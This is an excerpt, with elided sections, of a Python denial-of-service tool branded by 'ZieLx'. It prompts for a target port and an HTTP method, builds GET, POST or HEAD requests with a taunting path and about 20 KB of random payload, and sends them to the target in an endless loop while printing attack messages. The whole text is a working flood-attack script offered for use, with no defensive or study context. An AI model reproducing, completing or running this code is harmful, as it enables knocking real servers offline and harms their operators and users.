...
print("\033[92m=======================================================================================")
print("\033[92m[ × ] TOOLS DDOS 3 METHODS BY ZIELX") 
print("\033[92m
███████╗██╗███████╗██╗░░░░░██╗░░██╗
╚════██║██║██╔════╝██║░░░░░╚██╗██╔╝
░░███╔═╝██║█████╗░░██║░░░░░░╚███╔╝░
...
port = int(input("[+] Port : "))
method_attack = str(input("[+] Methods [Get/Post/Head] : "))
...
def Headers(method, referers=None):
    ...
    if method == "get" or method == "head":
        post_host = "POST /Your_Server_Got_DDoS_By_ZieLx_Will_Not_Surrender HTTP/1.1\r\nHost: " + ip + "\r\n"
...
os.system('color ' +random.choice(['B'])+ " & cls & title Tools DDoS Used By ZieLx [ DDoS Attack ]")
def run():
    header = Headers("get")
    i = random.choice(("[*]","[!]","[#]"))
    data = random._urandom(20179)
    if method_attack == "1":
        get_host = "GET /Your_Server_Got_DDoS_By_ZieLx_Will_Not_Surrender HTTP/1.1\r\nHost: " + ip + "\r\n"
        request  = get_host + header + "\r\n"
    else:
        get_host = random.choice(['GET','POST','HEAD']) + " /Your_Server_Got_DDoS_By_ZieLx_Will_NoSurrender HTTP/1.1\r\nHost: " + ip + "\r\n"
        request  = get_host + header + "\r\n"
    while True:
        try:
            ...
            s.close()
            print("\033[92m[ + ] ZieLx Attacking Server IP => \033[1;31;40m",ip," \033[92mAnd Port \033[1;31;40m",port,"!")
